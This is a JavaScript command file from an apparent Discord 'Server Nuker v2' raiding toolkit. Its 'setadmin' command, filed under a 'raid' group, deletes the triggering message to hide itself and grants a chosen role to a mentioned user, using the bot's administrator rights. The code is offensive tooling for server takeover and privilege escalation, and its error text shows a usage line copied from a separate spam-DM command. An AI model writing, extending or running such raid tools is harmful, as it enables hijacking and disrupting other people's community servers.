const Commando = require("discord.js-commando");
const Discord = require("discord.js");

module.exports = class SetAdminCommands extends Commando.Command {
  constructor(client) {
    super(client, {
      name: "setadmin",
      group: "raid",
      memberName: "setadmin",
      description: "Set an admin on a serv",
      guildOnly: true,
      argsType: "multiple",
      clientPermissions: ["ADMINISTRATOR"],
    });
  }

  async run(message, args) {
    message.delete();

    const failEmbed = new Discord.MessageEmbed()
      .setAuthor("Set an admin")
      .setColor("#ff0000")
      .setFooter("Server Nuker v2", "https://i.imgur.com/BCDIf5E.jpg")
      .setDescription("Invalid arguments provided!\n`.spamdm <@user/user ID>`");

    if (!args[0]) {
      message.channel.send(failEmbed);
      return;
    }

    let myRoleName = args[1];

    let role = message.guild.roles.cache.find((r) => r.name === myRoleName);

    // Let's pretend you mentioned the user you want to add a role to (!addrole @user Role Name):
    let member = message.mentions.members.first();

    // Add the role!
    member.roles.add(role).catch(console.error);

    const moment = require("moment");
    const time = moment().format("HH:mm:ss a");
    console.log(`${time} | Command Ran: setadmin`);
  }
};
